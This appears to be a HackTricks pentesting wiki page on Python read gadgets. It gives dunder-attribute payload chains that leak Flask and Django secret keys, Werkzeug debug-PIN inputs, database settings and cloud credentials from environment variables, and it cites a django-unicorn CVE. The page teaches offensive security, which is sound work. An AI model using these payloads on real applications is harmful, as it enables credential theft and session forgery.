# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

Different vulnerabilities such as [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) or [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) might allow you to **read python internal data but won't allow you to execute code**. Therefore, a pentester will need to make the most of these read permissions to **obtain sensitive privileges and escalate the vulnerability**.

### Flask - Read secret key

The main page of a Flask application will probably have the **`app`** global object where this **secret is configured**.

```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```

In this case it's possible to access this object just using any gadget to **access global objects** from the [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html).

In the case where **the vulnerability is in a different python file**, you need a gadget to traverse files to get to the main one to **access the global object `app.secret_key`** to change the Flask secret key and be able to [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

A payload like this one [from this writeup](https://ctftime.org/writeup/36082):

```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```

Use this payload to **change `app.secret_key`** (the name in your app might be different) to be able to sign new and more privileges flask cookies.

### Werkzeug - machine_id and node uuid

[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) you will be able to access the **machine_id** and the **uuid** node, which are the **main secrets** you need to [**generate the Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) you can use to access the python console in `/console` if the **debug mode is enabled:**

```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```

> [!WARNING]
> Note that you can get the **servers local path to the `app.py`** generating some **error** in the web page which will **give you the path**.

If the vulnerability is in a different python file, check the previous Flask trick to access the objects from the main python file.

### Django - SECRET_KEY and settings module

The Django settings object is cached in `sys.modules` once the application starts. With only read primitives you can leak the **`SECRET_KEY`**, database credentials or signing salts:

```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.DATABASES, a.SIGNING_BACKEND)
```

If the vulnerable gadget is in another module, walk globals first:

```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```

Once the key is known you can forge Django signed cookies or tokens in a similar way to Flask.

### Environment variables / cloud creds via loaded modules

Many jails still import `os` or `sys` somewhere. You can abuse any reachable function `__init__.__globals__` to pivot to the already-imported `os` module and dump **environment variables** containing API tokens, cloud keys or flags:

```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```

If the subclass index is filtered, use loaders:

```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```

Environment variables are frequently the only secrets needed to move from read to full compromise (cloud IAM keys, database URLs, signing keys, etc.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` (<0.62.0) allowed **class pollution** via crafted component requests. Setting a property path such as `__init__.__globals__` let an attacker reach the component module globals and any imported modules (e.g. `settings`, `os`, `sys`). From there you can leak `SECRET_KEY`, `DATABASES` or service credentials without code execution. The exploit chain is purely read-based and uses the same dunder-gadget patterns as above.

### Gadget collections for chaining

Recent CTFs (e.g. jailCTF 2025) show reliable read chains built only with attribute access and subclass enumeration. Community-maintained lists such as [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) catalog hundreds of minimal gadgets you can combine to traverse from objects to `__globals__`, `sys.modules` and finally sensitive data. Use them to quickly adapt when indices or class names differ between Python minor versions.



## References

- [Wiz analysis of django-unicorn class pollution (CVE-2025-24370)](https://www.wiz.io/vulnerability-database/cve/cve-2025-24370)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
